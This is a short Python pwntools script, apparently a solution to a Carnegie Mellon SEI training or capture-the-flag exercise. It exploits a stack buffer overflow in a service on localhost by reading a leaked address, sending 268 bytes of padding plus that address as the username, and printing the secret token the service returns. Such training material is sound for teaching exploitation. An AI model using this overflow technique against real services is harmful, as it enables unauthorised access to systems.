#!/usr/bin/python3

# Copyright 2022 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.

import pwn  #import pwntools
from pwn import *
offset = 268 #sets unique offset
sock=remote('localhost',11111) #connects to socket
secret = sock.recvline_startswith("Need to get to") #waits until secret
print(secret) #prints secret address
secret = (secret[-10:]) #removes other characters from line
secret=(secret.decode("utf-8")) #decodes address
key = p32(int(secret, 0))
print(key) #prints key in little endian
sock.recvline(1024) #Enter username
padding = "A" * offset #multiples A * offset
print(bytes(padding, "utf-8") + key) #prints padding + key
sock.sendline(bytes(padding, "utf-8") + key) #Sends to socket
a = sock.recv(1024) #Hello, username, Enter Password
print(a)
sock.sendline("password")
a = sock.recvuntil(b"ESP: ")
print(a) 
a = sock.recv(10)
print(a) #prints out secret token

